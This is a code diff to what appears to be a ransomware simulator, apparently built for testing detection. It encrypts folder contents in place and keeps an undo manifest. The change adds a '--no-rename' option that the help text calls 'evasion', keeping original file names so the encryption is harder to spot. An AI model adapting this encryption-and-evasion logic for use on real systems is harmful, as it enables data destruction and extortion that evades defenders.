@@ -39,7 +39,7 @@ def save_manifest(mpath: Path, manifest: dict):
         except PermissionError:
             time.sleep(0.05)
     os.replace(tmp, mpath)              # last try; raises if still locked         # atomic: the manifest is never half-written
-def encrypt(target: Path, delay: float, partial: int | None, note: bool):
+def encrypt(target: Path, delay: float, partial: int | None, note: bool, no_rename: bool = False):    
     KEY_DIR.mkdir(parents=True, exist_ok=True)
     mpath = manifest_path(target)
     if mpath.exists():
@@ -58,8 +58,7 @@ def encrypt(target: Path, delay: float, partial: int | None, note: bool):
             continue
         nonce = secrets.token_bytes(16)
         n = len(data) if partial is None else min(partial, len(data))
-        dest = p.with_name(p.name + EXT)
-
+        dest = p if no_rename else p.with_name(p.name + EXT)
         # 1) record everything needed to undo, BEFORE touching the file
         manifest["files"][str(dest)] = {"orig": str(p), "nonce": nonce.hex(),
                                         "n": n, "sha256": sha256(data)}
@@ -67,7 +66,8 @@ def encrypt(target: Path, delay: float, partial: int | None, note: bool):
         # 2) overwrite in place, then rename (typical ransomware behaviour)
         enc = aes_ctr(key, nonce).encryptor()
         p.write_bytes(enc.update(data[:n]) + enc.finalize() + data[n:])
-        p.rename(dest)
+        if not no_rename:
+            p.rename(dest)        
         print(f"[sim] encrypted {p.name}")
         if delay:
             time.sleep(delay)
@@ -118,9 +118,10 @@ if __name__ == "__main__":
     ap.add_argument("--delay", type=float, default=0, help="seconds between files (slow mode)")
     ap.add_argument("--partial", type=int, default=None, help="only encrypt first N bytes")
     ap.add_argument("--no-note", action="store_true")
+    ap.add_argument("--no-rename", action="store_true", help="evasion: encrypt in place, keep file names")
     a = ap.parse_args()
     t = check_target(a.folder)
     if a.mode == "encrypt":
-        encrypt(t, a.delay, a.partial, not a.no_note)
+        encrypt(t, a.delay, a.partial, not a.no_note, a.no_rename) 
     else:
         decrypt(t)
